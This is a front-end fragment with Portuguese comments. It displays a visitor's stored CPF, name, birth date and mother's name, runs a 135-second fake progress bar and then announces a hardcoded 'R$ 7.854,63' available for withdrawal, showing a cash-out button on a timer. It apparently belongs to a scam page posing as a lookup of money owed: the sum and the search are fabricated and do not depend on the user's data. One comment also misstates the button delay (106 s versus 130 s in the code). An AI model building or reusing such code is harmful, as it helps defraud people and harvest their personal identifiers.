<script>
  // Função para formatação do CPF
  function formatCPF(cpf) {
    if (!cpf) return '';
    let digits = cpf.replace(/\D/g, '');
    return digits.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
  }

  // Função para extrair iniciais do nome
  function getInitials(fullName) {
    if (!fullName || fullName.trim() === '') return 'U';
    
    const names = fullName.trim().split(' ');
    if (names.length === 1) {
      return names[0].charAt(0).toUpperCase();
    }
    
    // Pegar primeira letra do primeiro nome e primeira letra do último nome
    const firstInitial = names[0].charAt(0).toUpperCase();
    const lastInitial = names[names.length - 1].charAt(0).toUpperCase();
    
    return firstInitial + lastInitial;
  }

  // Função para carregar os dados do usuário do localStorage
  document.addEventListener('DOMContentLoaded', function() {
    try {
      // Recuperar dados do localStorage
      const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
      
      if (dadosUsuario) {
        // Preencher os campos com os dados do usuário
        document.getElementById('cpf-value').textContent = formatCPF(dadosUsuario.cpf) || '---';
        document.getElementById('name-value').textContent = dadosUsuario.nome || '---';
        document.getElementById('user-name').textContent = dadosUsuario.nome || '---';
        document.getElementById('birth-value').textContent = dadosUsuario.dataNascimento || '---';
        document.getElementById('mother-value').textContent = dadosUsuario.nomeMae || '---';
        
        // Atualizar o nome do usuário no cabeçalho
        const userName = document.getElementById('user-name');
        
        if (userName && dadosUsuario.nome) {
          // Pegar apenas o primeiro nome
          const primeiroNome = dadosUsuario.nome.split(' ')[0];
          userName.textContent = primeiroNome || 'Usuário';
        }
      }
    } catch (error) {
      console.error('Erro ao carregar dados do usuário:', error);
    }
  });
</script>

<script>
  const progressBar = document.getElementById("progress-bar");
  const statusText = document.getElementById("status-text");
  const saqueButton = document.getElementById("button-saque");

  const duration = 135; // segundos
  let elapsed = 0;

  const interval = setInterval(() => {
    elapsed++;
    const percent = (elapsed / duration) * 100;
    progressBar.style.width = percent + "%";

    if (elapsed >= duration) {
      clearInterval(interval);
      statusText.innerText = "Total identificado para resgate: R$ 7.854,63. ";
    }
  }, 1000);

  // Mostrar botão de saque após 1 minuto e 46 segundos (106 segundos)
  setTimeout(() => {
    saqueButton.style.display = "block";
  }, 130000);
</script>
